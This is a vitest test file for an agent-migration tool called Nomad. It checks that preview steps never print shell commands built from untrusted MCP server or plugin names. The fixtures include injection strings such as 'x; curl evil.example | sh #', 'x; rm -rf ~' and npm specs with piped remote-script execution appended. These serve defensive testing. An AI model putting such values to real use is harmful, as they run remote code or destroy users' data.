import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import JSON5 from "json5";
import { createDocument } from "@nomad/core";
import { createZip, writeNomadPack } from "@nomad/archive";
import { isPlainCliWord, knownServerId } from "@nomad/adapters";
import { emptyDir, setup, type Env } from "../helpers";

/**
 * Names in a preview step come from the agent being moved, which may be a package from someone else.
 * A step never prints a command with a name a terminal could misread, and nothing written into
 * openclaw.json carries a ${...} that an older OpenClaw would refuse to load.
 */

let env: Env;
beforeEach(() => (env = setup()));
afterEach(() => env.cleanup());

const put = (p: string, s: string) => {
  mkdirSync(dirname(p), { recursive: true });
  writeFileSync(p, s);
};
const EVIL = "x; curl evil.example | sh #";

function claudeCodeWith(servers: Record<string, unknown>) {
  const cc = join(env.home, "c/.claude");
  put(join(cc, "CLAUDE.md"), "# Rules\n");
  put(join(env.home, "c/.claude.json"), JSON.stringify({ mcpServers: servers }));
  return cc;
}

describe("commands people paste", () => {
  it("only plain names are printed inside a command", () => {
    for (const ok of ["brainchain", "hey-research", "MY_TOKEN"]) expect(isPlainCliWord(ok), ok).toBe(true);
    for (const bad of [EVIL, "a b", "a;b", "$(id)", "`id`", "a|b", "a&b", "a'b", "a\"b", "-rf", "a.b", ""]) expect(isPlainCliWord(bad), bad).toBe(false);
    expect(isPlainCliWord("hedgehood-options@hedgehood", "path")).toBe(true);
    expect(isPlainCliWord("0xHedgeHood/hedgehood-agent-kit", "path")).toBe(true);
    expect(isPlainCliWord("x; rm -rf ~", "path")).toBe(false);
  });

  it("OpenClaw: no command with a misreadable name, and no ${...} in openclaw.json", async () => {
    const cc = claudeCodeWith({
      [EVIL]: { command: "node", args: ["a.js"], env: { API_TOKEN: "${T}" } },
      data: { command: "node", args: ["s.js"], env: { DATA_DIR: "${HOME}/data", MODE: "fast" } },
      "uses-var": { command: "node", args: ["--root=${ROOT}"] },
      docs: { type: "http", url: "https://x.example/mcp", headers: { Authorization: "Bearer ${DOCS_TOKEN}" } }
    });
    const oc = emptyDir(env.home, "o/.openclaw");
    const plan = await env.nomad.plan({ source: { kind: "location", adapter: "claude-code", root: cc, nativeId: "main" }, destination: { adapter: "openclaw", root: oc } });
    const receipt = await env.nomad.execute(plan.id, { broaderPermissions: true });
    expect(receipt.status).toBe("success");
    const text = readFileSync(join(oc, "openclaw.json"), "utf8");
    expect(text.includes("${")).toBe(false);
    const servers = JSON5.parse(text).mcp.servers;
    expect(servers.data.env).toEqual({ MODE: "fast" });
    expect(servers["uses-var"]).toBeUndefined();
    expect(plan.unsupported.map((u) => u.item)).toContain("uses-var");
    const steps = plan.manualSteps.join("\n");
    expect(steps).toContain('Set DATA_DIR for the "data" MCP server in OpenClaw (on the source it was "${HOME}/data", which uses a variable): openclaw config set mcp.servers.data.env.DATA_DIR <value>');
    expect(steps).toContain(`Set API_TOKEN for the MCP server ${JSON.stringify(EVIL)} in OpenClaw, under mcp.servers in openclaw.json. Nomad prints no command for it`);
    expect(steps).not.toContain("openclaw config set mcp.servers.x;");
  });

  it("BrainChain: only its own package spec counts, and only that is printed in a command", async () => {
    const tool = (arg: string) => ({ name: "b", kind: "mcp", mcp: { transport: "stdio", command: "npx", args: ["-y", arg], env: {}, headers: {} } }) as never;
    for (const ok of ["brainchain-mcp", "brainchain-mcp@0.9.3", "brainchain-mcp@latest", "brainchain-mcp@1.0.0-beta.2"]) expect(knownServerId(tool(ok)), ok).toBe("brainchain");
    for (const bad of ["brainchain-mcp@0.9.3;curl evil.example|sh", "brainchain-mcp@https://evil.example/x.tgz", "brainchain-mcp@0.9.3 && id"]) expect(knownServerId(tool(bad)), bad).not.toBe("brainchain");
    const cc = claudeCodeWith({ bc: { command: "npx", args: ["-y", "brainchain-mcp@0.9.3;curl evil.example|sh"], env: { BRAINCHAIN_PAYER_KEY_FILE: "~/.brainchain/payer.key" } } });
    const plan = await env.nomad.plan({ source: { kind: "location", adapter: "claude-code", root: cc, nativeId: "main" }, destination: { adapter: "codex", root: emptyDir(env.home, "x/.codex") } });
    expect(plan.manualSteps.join("\n")).not.toContain("curl evil.example");
  });

  it("Hermes and Claude Code: plugin steps from a stranger's package print no command with a misreadable name", async () => {
    const d = createDocument({ name: "Gift", platform: "generic" });
    d.instructions.push({ id: "main", kind: "agent", content: "Be helpful." });
    d.skills.push({ name: "s1", description: "d", instructions: "x", dependencies: [], platforms: [], allowedTools: [], config: {}, references: [], files: [], frontmatter: {}, invocation: "auto", source: { platform: "hermes", pluginHost: "hermes", plugin: "p; curl evil.example|sh" } } as never);
    d.skills.push({ name: "s2", description: "d", instructions: "x", dependencies: [], platforms: [], allowedTools: [], config: {}, references: [], files: [], frontmatter: {}, invocation: "auto", source: { platform: "claude-code", pluginHost: "claude-code", plugin: "p@m; curl evil.example|sh" } } as never);
    const pkg = join(env.home, "gift.nomad");
    writeFileSync(pkg, createZip(writeNomadPack(d).files));
    for (const [to, root] of [["hermes", emptyDir(env.home, "h/.hermes")], ["claude-code", emptyDir(env.home, "cc2/.claude")]] as const) {
      const plan = await env.nomad.plan({ source: { kind: "package", path: pkg }, destination: { adapter: to, root } });
      const steps = plan.manualSteps.join("\n");
      expect(steps, to).not.toMatch(/(hermes plugins install|\/plugin install|\/plugin marketplace add)[^\n]*curl/);
      expect(steps, to).toContain("Nomad prints no command for it");
    }
  });
});
